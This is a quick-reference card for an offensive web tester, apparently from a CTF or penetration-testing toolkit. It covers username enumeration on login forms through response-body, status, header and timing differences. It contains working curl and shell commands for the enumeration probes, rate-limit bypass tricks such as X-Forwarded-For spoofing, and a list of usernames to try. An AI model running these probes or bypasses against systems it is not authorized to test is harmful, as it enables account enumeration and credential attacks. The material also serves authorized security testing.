# Quick reference (deep) — the full operator card

## The oracle — the 3-request probe

```bash
curl -i -X POST -d 'user=KNOWN&pass=x'      "$BASE/<form>" > good
curl -i -X POST -d 'user=zzz-NOSUCH&pass=x' "$BASE/<form>" > bad1
curl -i -X POST -d 'user=zzz-NOSUCH&pass=x' "$BASE/<form>" > bad2
python3 tools/web/enum_probe.py --url "$BASE/<form>" --body 'user={U}&pass=x' --known-user KNOWN
```

## The channel diffs

```bash
# body — masked raw diff
diff <(sed -E 's/(csrf|nonce|token|_ts)[^<"& ]*//g;s/value="[^"]*"//g' good) \
     <(sed -E 's/(csrf|nonce|token|_ts)[^<"& ]*//g;s/value="[^"]*"//g' bad1)
# status + redirect
grep -iE '^HTTP|^location' good bad1
# envelope — cookies/headers
diff <(grep -iE 'set-cookie|x-|retry|ratelimit' good) <(grep -iE 'set-cookie|x-|retry|ratelimit' bad1)
# timing — interleaved median
for i in $(seq 10); do
  curl -s -o /dev/null -w "g %{time_total}\n" -X POST -d 'user=KNOWN&pass=x' "$BASE/<f>"
  curl -s -o /dev/null -w "b %{time_total}\n" -X POST -d 'user=zzz-NOSUCH&pass=x' "$BASE/<f>"
done | sort -k2n | awk '{a[$1]+=$2;c[$1]++}END{print "g",a["g"]/c["g"],"b",a["b"]/c["b"]}'
```

## The oracle shapes — verbatim

- `"no such user"` / `"wrong password"` / `"username taken"` — text
- `?e=1`/`?e=2`, `error=user`/`error=pass`, `404`/`401` — status/redirect
- `{"error":"user_not_found"}`, `{"exists":...}`, `{"code":1001}` — JSON
- a `Set-Cookie`, an `attempts_remaining`, an `emails_sent` — side
- `good` 50-300ms slower — timing
- a `423`/`429` on a real name — lock oracle

## The throttle

```bash
for i in {1..15}; do curl -s -o /dev/null -w '%{http_code} ' -X POST -d "user=t$i&pass=x" "$BASE/login"; done
# bypass probes
-H 'X-Forwarded-For: 9.9.9.9' | fresh-session | /api/login | GET | json | /LOGIN
```

## The candidate list (bounded, scoped)

`admin administrator root test demo user guest ctf flag service backup
deploy jenkins gitlab ci bot` + own account + challenge-named + app-leaked.

## The route

confirmed → `web-auth-session`/`web-idor`/`web-logic-flaw`/`web-oauth-sso`.
throttle → absent/threshold/bypassed, all findings.

## The falsifier

all four channels uniform on every account-touching form = closed.
